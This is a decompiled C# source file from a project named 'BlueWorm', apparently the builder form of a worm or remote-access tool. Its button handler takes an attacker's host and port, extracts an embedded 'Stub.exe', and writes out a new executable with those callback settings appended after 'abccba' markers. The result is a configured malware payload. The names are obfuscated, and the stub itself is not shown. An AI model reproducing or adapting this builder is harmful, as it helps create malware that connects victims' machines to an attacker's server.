using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace BlueWorm
{
	// Token: 0x02000013 RID: 19
	[DesignerGenerated]
	public partial class Form6 : Form
	{
		// Token: 0x0600010D RID: 269 RVA: 0x000027ED File Offset: 0x000009ED
		// Note: this type is marked as 'beforefieldinit'.
		[DebuggerNonUserCode]
		static Form6()
		{
			Class9.jBg04XuzOGhUk();
			Form6.list_0 = new List<WeakReference>();
		}

		// Token: 0x0600010E RID: 270 RVA: 0x000027FE File Offset: 0x000009FE
		[DebuggerNonUserCode]
		public Form6()
		{
			Class9.jBg04XuzOGhUk();
			base..ctor();
			base.Load += this.Form6_Load;
			Form6.smethod_0(this);
			this.InitializeComponent();
		}

		// Token: 0x0600010F RID: 271 RVA: 0x00008C28 File Offset: 0x00006E28
		[DebuggerNonUserCode]
		private static void smethod_0(object object_0)
		{
			List<WeakReference> obj = Form6.list_0;
			checked
			{
				lock (obj)
				{
					if (Form6.list_0.Count == Form6.list_0.Capacity)
					{
						int num = 0;
						int num2 = 0;
						int num3 = Form6.list_0.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = Form6.list_0[num4];
							if (weakReference.IsAlive)
							{
								if (num4 != num)
								{
									Form6.list_0[num] = Form6.list_0[num4];
								}
								num++;
							}
							num4++;
						}
						Form6.list_0.RemoveRange(num, Form6.list_0.Count - num);
						Form6.list_0.Capacity = Form6.list_0.Count;
					}
					Form6.list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
				}
			}
		}

		// Token: 0x1700003C RID: 60
		// (get) Token: 0x06000112 RID: 274 RVA: 0x00008FA0 File Offset: 0x000071A0
		// (set) Token: 0x06000113 RID: 275 RVA: 0x00008FB8 File Offset: 0x000071B8
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				if (this._Button1 != null)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				if (this._Button1 != null)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x06000114 RID: 276 RVA: 0x00009010 File Offset: 0x00007210
		// (set) Token: 0x06000115 RID: 277 RVA: 0x0000282A File Offset: 0x00000A2A
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x06000116 RID: 278 RVA: 0x00009028 File Offset: 0x00007228
		// (set) Token: 0x06000117 RID: 279 RVA: 0x00002833 File Offset: 0x00000A33
		internal virtual TextBox TextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this.vwtocPtLk3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this.vwtocPtLk3 = value;
			}
		}

		// Token: 0x06000118 RID: 280 RVA: 0x00009040 File Offset: 0x00007240
		[MethodImpl(MethodImplOptions.NoOptimization)]
		private void Button1_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.TextBox1.Text + this.TextBox2.Text, "", false) == 0)
			{
				Interaction.MsgBox("Add Host and Port ", MsgBoxStyle.OkOnly, null);
			}
			else
			{
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.ShowDialog();
				if (Operators.CompareString(saveFileDialog.FileName, "", false) > 0)
				{
					this.string_1 = this.TextBox1.Text;
					this.string_2 = this.TextBox2.Text;
					string text = Path.GetTempPath() + "Stub.exe";
					File.WriteAllBytes(text, Class7.smethod_1());
					FileSystem.FileOpen(1, text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default, -1);
					this.string_0 = Strings.Space(checked((int)FileSystem.LOF(1)));
					FileSystem.FileGet(1, ref this.string_0, -1L, false);
					FileSystem.FileClose(new int[]
					{
						1
					});
					FileSystem.FileOpen(1, saveFileDialog.FileName + ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default, -1);
					FileSystem.FilePut(1, string.Concat(new string[]
					{
						this.string_0,
						"abccba",
						this.string_1,
						"abccba",
						this.string_2
					}), -1L, false);
					FileSystem.FileClose(new int[0]);
					Interaction.MsgBox(string.Concat(new string[]
					{
						"Done !! ",
						Environment.NewLine,
						"File Saved in ",
						Environment.NewLine,
						saveFileDialog.FileName
					}), MsgBoxStyle.OkOnly, null);
				}
				else
				{
					Interaction.MsgBox(this.exception_0.Message, MsgBoxStyle.OkOnly, null);
				}
			}
		}

		// Token: 0x06000119 RID: 281 RVA: 0x0000283C File Offset: 0x00000A3C
		private void method_0(object sender, EventArgs e)
		{
			this.TextBox1.Text = this.method_1();
		}

		// Token: 0x0600011A RID: 282 RVA: 0x000091F4 File Offset: 0x000073F4
		private string method_1()
		{
			string result;
			try
			{
				IPHostEntry hostByName = Dns.GetHostByName(Dns.GetHostName());
				string text = hostByName.AddressList.GetValue(0).ToString();
				result = text;
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x0600011B RID: 283 RVA: 0x000025ED File Offset: 0x000007ED
		private void Form6_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0400006B RID: 107
		private static List<WeakReference> list_0;

		// Token: 0x0400006D RID: 109
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x0400006E RID: 110
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x0400006F RID: 111
		[AccessedThroughProperty("TextBox2")]
		private TextBox vwtocPtLk3;

		// Token: 0x04000070 RID: 112
		private string string_0;

		// Token: 0x04000071 RID: 113
		private string string_1;

		// Token: 0x04000072 RID: 114
		private string string_2;

		// Token: 0x04000073 RID: 115
		private Exception exception_0;
	}
}
